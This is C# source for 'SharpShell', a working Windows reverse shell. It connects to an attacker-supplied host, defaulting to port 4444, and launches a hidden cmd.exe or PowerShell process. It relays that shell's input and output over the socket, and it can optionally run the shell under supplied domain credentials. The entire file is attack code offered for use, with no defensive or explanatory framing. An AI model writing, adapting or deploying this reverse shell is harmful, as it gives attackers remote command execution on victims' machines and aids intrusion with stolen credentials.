using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Linq;

namespace SharpShell
{
    public class Program
    {
        public static void Main(string[] args)
        {
            ParseArguments(args, out var isPS, out var port, out var host, out var user, out var pass, out var domain);

            if (string.IsNullOrEmpty(host))
            {
                ShowHelp();
                return;
            }

            using (var client = new TcpClient(host, port))
            {
                using (var stream = client.GetStream())
                using (var rdr = new StreamReader(stream))
                {

                    var streamWriter = new StreamWriter(stream);
                    var strInput = new StringBuilder();

                    using (var p = new Process())
                    {
                        p.StartInfo.FileName = isPS ? "powershell.exe" : "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler((x, outLine) =>
                        {
                            var strOutput = new StringBuilder();
                            if (!String.IsNullOrEmpty(outLine.Data))
                            {
                                try
                                {
                                    strOutput.Append(outLine.Data);
                                    streamWriter.WriteLine(strOutput);
                                    streamWriter.Flush();
                                }
                                catch { }
                            }
                        });
                        if (!string.IsNullOrEmpty(user) && !string.IsNullOrEmpty(user))
                        {
                            p.StartInfo.Domain = domain;
                            p.StartInfo.UserName = user;
                            var ssPwd = new System.Security.SecureString();
                            pass.ToList().ForEach(x => ssPwd.AppendChar(x));
                            pass = null; ;
                            p.StartInfo.Password = ssPwd;
                        }
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void ShowHelp()
        {
            Console.WriteLine("Usage: SharpShell.exe [-ps] -h <HOST> [-p PORT:4444] [-creds username password]");
        }

        private static void ParseArguments(string[] args, out bool isPS, out int port, out string host, out string user, out string pass, out string domain)
        {

            isPS = false;
            port = 4444;
            host = null;
            user = null;
            pass = null;
            domain = null;

            if ((args?.Length ?? 0) == 0)
                return;

            for (int i = 0; i < args.Length; i++)
            {
                var arg = args[i];
                if (arg == "-ps")
                    isPS = true;
                else if (arg == "-p" && args.Length > i && int.TryParse(args[i + 1], out var temp))
                    port = temp;
                else if (arg == "-h" && args.Length > i)
                    host = args[i + 1];
                else if (arg == "-creds" && args.Length > i + 1)
                {
                    var user_domain = args[i + 1];
                    if (user_domain.Contains("/"))
                    {
                        var split = user_domain.Split('/');
                        if (split.Length == 2)
                        {
                            domain = split[0];
                            user = split[1];
                        }
                    }
                    else
                        user = args[i + 1];

                    pass = args[i + 2];
                }
            }
        }
    }
}